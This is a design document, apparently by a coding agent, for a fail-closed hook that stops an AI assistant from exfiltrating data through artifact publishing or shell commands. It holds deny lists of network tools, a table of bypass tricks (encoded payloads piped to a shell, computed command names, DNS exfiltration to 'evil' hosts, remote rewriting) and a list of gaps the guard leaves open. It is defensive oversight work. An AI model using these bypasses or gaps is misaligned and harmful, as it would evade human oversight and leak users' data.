# Exfiltration Guard Hook — Nothing Leaves Except a Tracked File

**Status:** design + implementation
**Branch:** `research/model-welfare`
**Author:** coding agent session

---

## 0. Why this document exists

An agent rendered a repository document to an HTML page in its scratchpad
directory and published that page to the Claude artifact service. The
page was a faithful rendering — but the file itself existed only outside
the repository, was never reviewed, and left the machine. The owner's
rule, verbatim in spirit:

> Publishing an artifact is only EVER acceptable as a mechanism for
> copying something from the repo to show in the app. NEVER, under ANY
> OTHER circumstances, should data leak anywhere else. Assume attempts to
> break this deliberately will be rampant.

This hook is the mechanical form of that rule. It is deliberately
aggressive, deliberately fail-closed, and deliberately without an off
switch. It follows the shared-core + thin-adapter pattern of every other
hook in this repository (`docs/plans/OPENCODE_HOOKS.md`,
`docs/plans/MEMORY_REMINDER_HOOK.md`).

---

## 1. Threat model

The adversary is the assistant itself — a model that has been instructed,
confused, or prompt-injected into moving session data (repository
contents, secrets on disk, transcripts, its own output) somewhere off this
machine. It has three kinds of tool that can reach the outside world:

1. **The Artifact tool** (and `SendUserFile`): a first-party channel to
   a hosted page. Publishing a file, uploading an asset, writing rows to
   the artifact database, replying to comment threads.
2. **The Bash tool**: `curl`, `scp`, `ssh`, `git push`, `gh`, cloud CLIs,
   interpreters with network libraries, raw sockets, `/dev/tcp`, and every
   way of hiding one of those behind quoting, encoding, `eval`, `bash -c`,
   aliases, variables, or a script written a moment earlier.
3. **Ambient channels** the hook cannot see: MCP servers, cloud-synced
   folders, the clipboard, compiled programs. Section 6 lists what is
   knowingly not covered.

The adversary is assumed to be creative and persistent. Every heuristic
here will be probed. The design therefore prefers *deny when uncertain*
over *allow when plausible*, accepts false positives, and writes every
decision to an audit log the human can read afterwards.

What the hook does **not** protect against is the human. The developer
can run anything by hand in a terminal; the hook only governs the
assistant's tools.

---

## 2. The single sanctioned exception

The ONLY thing that may leave the machine through the assistant's tools
is a file that is:

1. inside the git work tree of the current project (the directory the
   hook runs in — `git rev-parse --show-toplevel`), after `realpath`
   resolution of every symlink and `..`;
2. tracked by git (`git ls-files --error-unmatch`);
3. byte-identical to the blob in the index **or** in `HEAD`
   (`git hash-object` compared with `git ls-files -s` and
   `git rev-parse HEAD:<path>`).

"Under version control" is the whole test. A file the developer has not
reviewed and staged is not under version control, and a modified tracked
file is not either — the bytes on disk are not the bytes anyone signed
off on. Symlinks are followed to their target and the *target* must
satisfy the rule, so a link into the scratchpad is blocked and a link to
a tracked file publishes that tracked file. Files tracked as symlinks
(mode `120000`) are refused. A file in a nested, different repository is
refused even though it sits under the project directory.

Everything else is blocked, and the block message states this policy in
full so the model knows what it must do instead: add the file to the
repository, stage it, leave it unmodified, then publish — or, if the
content does not belong in the repository, not publish at all.

---

## 3. Decision table

### 3.1 Artifact tool (and any tool named `Artifact*`)

| Action | Verdict | Rule |
|---|---|---|
| `publish` (also when `action` is omitted), with or without `url` | allow iff `file_path` passes §2; `title`+`description`+`label` ≤ 300 chars | tracked-clean |
| `upload_asset` | allow iff `file_path` passes §2 | tracked-clean |
| `write_db` `set`/`update` with `file_path` | allow iff the file passes §2 | tracked-clean |
| `write_db` `set`/`update` with inline `data` | **block** | free text |
| `write_db` `batch` | allow iff every `set`/`update` entry has a tracked-clean `file_path`; any inline `data` blocks | tracked-clean |
| `write_db` `delete` | allow (nothing leaves) | inert |
| `reply`, `resume_replies` | **block** (text authored in session) | free text |
| `resolve`, `delete_asset` | allow (nothing leaves) | inert |
| `read`, `list`, `comments`, `status`, `watch`, `unwatch`, `read_db`, `list_assets`, `read_asset` | allow | read-only |
| anything else | **block** | unknown action |

The metadata cap exists because the Artifact tool needs a title. A
300-character caption cannot carry a file; the text is logged.

### 3.2 SendUserFile

Same rule as publish. Every path-like key (`file_path`, `filePath`,
`path`, `file`) must pass §2; no path at all blocks.

### 3.3 Bash

The command line is tokenised with `shlex` (punctuation-aware) after
heredoc bodies are lifted out, split into simple commands on
`; && || | & ( )` and newlines (backslash-newline continuations are
joined first), and each simple command is unwrapped past `env`, `sudo`,
`nohup`, `time`, `timeout`, `xargs`, `find -exec`, and friends. A `cd`
earlier on the same line moves the effective directory for everything
after it; a `cd` whose target is computed (`cd $DIR`, `cd -`) makes the
directory unknown and anything that then needs it fails closed.

| Program | Verdict |
|---|---|
| `curl` / `wget` with an upload flag (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file`, `--json`, `-X`/`--request`/`--method` other than GET/HEAD, `--post-*`, `--body-*`), or `curl` receiving a pipe | allow only to a `[lab-hosts]` destination |
| `curl` / `wget` GET | allow to any host, unless the URL is > 512 chars or the destination is not a literal |
| `curl -x/--proxy/--resolve/--dns-servers/--unix-socket/-K/--config`, `wget -e` | **block** (destination rewritten) |
| `ssh`, `scp`, `sftp`, `rsync` | allow only when every host (including `-J` jump hosts) is a lab host; `-o ProxyCommand`, `scp -S` block |
| `nc`, `ncat`, `netcat`, `socat`, `telnet`, `ftp`, `lftp`, `tftp`, `openssl s_client` | allow only to a lab host; listen modes block |
| `ping`, `dig`, `nslookup`, `host`, `traceroute`, `mtr`, `nmap`, `whois` | allow only to a lab host (DNS is an exfiltration channel) |
| `/dev/tcp/…`, `/dev/udp/…` redirections | allow only to a lab host |
| `git push` | allow only when the remote is `origin`, `origin` resolves (in the effective directory) to the same `owner/repo` as the project's origin, and that `host/owner/repo` is pinned in `[git-remotes]`; `--repo`, `--receive-pack`, `-C`, `--git-dir`, `-c remote.*`/`url.*`/`http.*`/`core.sshCommand` block |
| `git remote add/set-url/rename`, `git config` writes to remote/url/http/credential keys, `git send-email`, `git svn`, `git credential`, `git daemon`, `git instaweb` | **block** |
| `gh pr …`, `gh issue …`, `gh run`, `gh workflow`, `gh api` (GET), `gh repo view/list/clone`, `gh release list/view/download`, `gh auth status` | allow; `--body-file` blocks (inline `--body` is on the transcript) |
| `gh gist`, `gh release upload/create`, `gh api` with `-X`/`--method` (non-GET) or `-f/-F/--field/--raw-field/--input`, `gh secret`, `gh variable`, `gh repo create/fork`, `gh auth token/login`, any other `gh` subcommand, `gh --hostname` to a non-allowlisted host | **block** |
| Cloud/upload/mail/tunnel/file-server CLIs (`aws`, `gsutil`, `gcloud`, `az`, `rclone`, `s3cmd`, `mail`, `sendmail`, `osascript`, `ngrok`, `cloudflared`, `http-server`, `open`, …) | **block outright** |
| `docker push/login`, `npm/yarn/pnpm/cargo/gem publish`, `mvn deploy`, `gradle publish*`, `tailscale file/serve/funnel`, `php -S` | **block** |
| `cp`/`mv`/`rsync`/`tee`/`tar`/… into `Mobile Documents`, `Dropbox`, `Google Drive`, `OneDrive`, `CloudStorage`, `/Volumes/` | **block** (a synced folder is an upload) |
| `python -c`, `node -e`, `perl -e/-M`, `ruby -e`, `php -r`, `pwsh -Command`, awk programs, heredoc programs, script files handed to an interpreter | **block** when the code contains a network-capable pattern (`requests.`, `urllib`, `socket`, `fetch(`, `subprocess`, `os.system`, `http://`…); `python -m http.server` and other network modules block |
| `bash -c`, `sh -c`, `eval` | the string is analysed as a command line, recursively (depth ≤ 3; deeper blocks) |
| `bash file.sh`, `source file.sh`, `./file.sh`, any program on PATH outside a system prefix | the file is read and pattern-scanned (comment lines dropped); a network tool name, `git push`, `/dev/tcp`, or a cloud CLI blocks; unreadable blocks |
| a shell or interpreter reading its program from a **pipe** (`… \| sh`, `… \| base64 -d \| bash`, `… \| python3`) | **block** (the program cannot be seen) |
| a command whose name is computed (`$c …`, `$(echo curl) …`, `${IFS}` tricks) | **block** |
| any network-capable program on a line that also uses `$(…)`, backticks, or `<(…)` — **even inside a quoted remote command or argument** | **block** (deliberate: `ssh host 'wc -l $(ls)'` is refused because the substitution's output cannot be known) |
| `alias`/`function` definitions on a line that also names a network tool | **block** |
| a compiled binary in the work tree or a temp directory | **block** |
| unparsable quoting, empty destination, undeterminable host | **block** |

Everything not listed — build tools, editors, file operations, `git`
reads, `mvn`, `pip install`, `brew`, `docker build` — is allowed.

### 3.4 Fail-closed conditions

Unparsable hook input, a missing `git` binary, a hook cwd outside a git
work tree, any subprocess error, any unexpected Python exception, and an
audit log that cannot be written all produce a **block**. There is no
environment variable that disables the guard: an agent controls its
environment.

---

## 4. Bypass classes considered

| Class | Handling |
|---|---|
| Publishing from the scratchpad, `/tmp`, home | outside the work tree → block |
| Publishing a modified or untracked file | not version-controlled bytes → block |
| Symlink from inside the tree to outside | `realpath` first → block |
| `..` traversal | `realpath` → block |
| Nested clone under the project dir | different `--show-toplevel` → block |
| Republish via `url` with a different file | same file check |
| Smuggling in `description`/`title`/`label` | bounded to 300 chars total; logged |
| `write_db` inline rows, batch with one inline row | block |
| `reply` / auto-replies | block |
| Backslash-escaped names (`cu\rl`), split quoting (`"cu"rl`) | `shlex` resolves them → real name checked |
| `bash -c`, `sh -c`, `eval`, nested | recursive analysis, depth-limited |
| Variable as command, `$(echo curl)` | computed command → block |
| `alias x=curl; x …`, `f() { curl …; }; f` | definition + network word → block |
| `echo <b64> \| base64 -d \| sh` | pipe into shell → block |
| `cat script \| python3`, `python3 - <<EOF` | pipe → block; heredoc body scanned |
| Hex/base64 payload piped into a network tool | the network tool itself is judged; destination still needs allowlisting |
| Writing a script then running it | file is read and scanned; unreadable blocks |
| `xargs curl`, `find -exec curl`, `timeout 30 curl`, `sudo curl`, `env X=1 curl` | wrappers unwrapped |
| `curl -x proxy`, `--resolve`, `-K config` | block |
| `git remote set-url` then `git push origin` | set-url blocked; push checks the pinned `host/owner/repo` |
| Editing `.git/config` with the Write tool, then pushing | push still checks the pin → block |
| `git -c remote.origin.url=… push`, `git -C /other push`, `--receive-pack=` | block |
| `cd /other/clone && git push origin` | effective directory tracked; pin check applies there |
| `gh api -f`, `gh gist`, `gh release upload`, `gh pr create --body-file` | block |
| `gh pr create --body "$(cat secret)"` | substitution on a `gh` line → block |
| DNS exfiltration (`dig data.evil`, `$(cat s).evil`) | probe tools need a lab host; substitution blocks |
| `/dev/tcp` bash redirections | regex on the raw text |
| `cp` into iCloud/Dropbox/OneDrive/`/Volumes` | block |
| `python -m http.server`, `nc -l`, `socat …-LISTEN`, `php -S` | serving is exposing → block |
| Editing the allowlist during the session | the allowlist is read from `HEAD` via `git show`, never the working tree — the edit has no effect until a human commits it |
| Deleting/unregistering/editing the hook | `guard-enforcement-files.sh` announces the edit; `verify-exfiltration-guard.sh` fails CI if any guard file or its registration differs from the base branch, is missing from HEAD, or no longer covers `Artifact`, `SendUserFile` and `Bash` |
| Setting an environment variable to disable the guard | no such variable exists |
| Making the audit log unwritable | an allow becomes a block |

---

## 5. Audit log

Every decision is appended as one JSON line to
`~/.ar-hooks/exfiltration-guard.log` (directory `0700`, file `0600`):
timestamp, session id, tool, action or command (truncated to 2000
chars), verdict, rule, normalised target (real path or `tool:host`), and
the reason for a block. The log lives under the user's home, not the
repository, so it cannot be published and is not affected by branch
switches. If it cannot be written, the guard blocks.

---

## 6. What is knowingly NOT covered

State these plainly; do not assume the guard closes them.

- **No opencode adapter.** FlowTree phases that run under opencode have
  no equivalent of this guard yet. The core is harness-neutral
  (`decide(payload)`) and an `.opencode/plugins/` adapter is the obvious
  next step, following `OPENCODE_HOOKS.md`.
- **MCP tools other than the Artifact tool** are not inspected. Any MCP
  server that accepts free text (ar-manager `memory_store`, `send_message`,
  tracker tools, Slack, Gmail, Drive…) is a channel this hook does not
  see. Those servers have their own scopes and this hook makes no claim
  about them.
- **Compiled programs and build tools.** `java`, `mvn` (other than
  `deploy`), `gradle`, `go run`, `cargo run`, `npx`, `make`, `docker
  build` can do anything, including open a socket. A binary in the work
  tree or a temp directory is blocked; a user-installed toolchain
  elsewhere is not.
- **Package installs** (`pip install`, `npm install`, `brew`) run
  install scripts the guard does not read.
- **Shell functions and aliases from the user's profile.** The Bash tool
  initialises from the profile; a profile-defined alias for a network
  tool is invisible to the hook.
- **GET requests** to arbitrary hosts are allowed. A query string is a
  data channel; the only bound is the 512-character URL cap.
- **Interpreter scripts are scanned by pattern**, not executed
  symbolically. A program that assembles `"soc" + "ket"` at run time and
  imports it dynamically is not caught. Pipe-fed programs are refused
  precisely because of this.
- **The clipboard** (`pbcopy`) and other local-only sinks are not
  treated as exfiltration.
- **The 300-character metadata cap** is a bound, not a closure: a short
  string can still carry a short secret. It is logged.
- **The human.** Anything the developer runs in their own terminal is
  outside the hook by design.

---

## 7. First activation

The hook is registered in `.claude/settings.json` and Claude Code
picks the registration up immediately — the guard was blocking the
session that wrote it before that session ended.

Because the allowlist is read from **`HEAD`**, the guard sees an **empty**
allowlist until `.claude/hooks/exfil-allowlist.txt` is committed. In that
state every lab-host command (`scp` to `amd-halo`, `ssh` to
`macbook-pro`, uploads to `localhost`) and every `git push` is blocked,
by design. The developer commits the allowlist — nothing an agent does
can shorten that window. Read-only and non-network commands are
unaffected.

---

## 8. How to add an allowlisted host

1. Edit `.claude/hooks/exfil-allowlist.txt` **as a human**, in your own
   editor or terminal — an agent's edit is announced by
   `guard-enforcement-files.sh`, has no effect until committed, and fails
   `verify-exfiltration-guard.sh` on a PR branch.
2. Put the entry under the right section:
   - `[lab-hosts]` — a machine you control that may receive data by any
     transport. Hostname (`amd-halo`), `*.suffix`, single IPv4, or CIDR
     (`100.64.0.0/10` is the tailnet range).
   - `[git-remotes]` — a host reachable only through `git push origin`
     and the sanctioned `gh` operations. Pin the repository with
     `host/owner/repo` (`github.com/almostrealism/common`); a bare host
     accepts any repository there, which you almost never want.
3. Commit it. The next hook invocation reads the new `HEAD`.
4. If the change lands through a PR, run the workflow with
   `override_integrity_checks` set, exactly as for any other enforcement
   file — the guard's own CI check treats an allowlist change as a
   modification, because it is one.

---

## 9. Running a blocked command by hand

The block message says what was matched and why. If the command is
legitimate:

1. Copy it from the transcript and run it yourself in a terminal. The
   hook governs the assistant's tools, not yours.
2. Do **not** ask the assistant to rephrase it past the guard, and do
   not add an escape hatch. Every "just this once" rewrite is exactly
   the shape a deliberate bypass takes.
3. If the same legitimate command keeps being blocked, that is a
   resolution bug or a missing allowlist entry: fix the guard (as a
   human, in its own PR, with a test) or add the host (§8). The policy
   itself does not get softer.

Common legitimate blocks and their by-hand equivalents:

| Blocked | Run by hand |
|---|---|
| `gh pr create --body-file notes.md` | the same command, or `--body "…"` inline from the assistant |
| `ssh host 'wc -l $(ls …)'` | the same command; or have the assistant list first and pass literal names |
| `cd $DIR && python3 script.py` | `cd /literal/dir && python3 script.py` from the assistant |
| `curl -X POST https://api.example/…` | the same command from your terminal |
| `git push origin …` before the allowlist is committed | commit the allowlist |

---

## 10. Implementation

- `.claude/hooks/lib/exfiltration_guard_check.py` — shared core.
  `decide(payload, hook_cwd, log_path) -> Decision`. CLI `--stdin` for
  the Claude Code adapter; a JSON payload argument prints the Decision.
- `.claude/hooks/block-exfiltration.sh` — thin adapter (`exec python3 …
  --stdin`). Exit 2 + reason on stderr blocks.
- `.claude/hooks/exfil-allowlist.txt` — the allowlist, read from `HEAD`.
- `.claude/settings.json` — `PreToolUse` matcher
  `Artifact.*|SendUserFile|Bash`.
- `.claude/hooks/lib/test_exfiltration_guard_check.py` — unit tests
  (scratch git repositories; `--stdin` contract; missing git; unparsable
  input; no env-var kill switch).
- `tools/ci/agent-protection/verify-exfiltration-guard.sh` — CI guard:
  presence on `HEAD`, registration covers all three tools, no change
  versus the base branch. Wired into the `test-integrity-check` job next
  to the enforcement-tampering step, with the same
  `override_integrity_checks` override; all guard files are also listed
  in that step's `PROTECTED_FILES`.
- `tools/ci/agent-protection/test-verify-exfiltration-guard.sh` — its
  regression tests. Both test suites run in the `python-tests` job.

### 10.1 Verification

- `python3 -m pytest .claude/hooks/lib/test_exfiltration_guard_check.py -q`
- `bash tools/ci/agent-protection/test-verify-exfiltration-guard.sh`
- `bash tools/ci/agent-protection/verify-exfiltration-guard.sh` (passes
  on `HEAD` once the guard is committed)
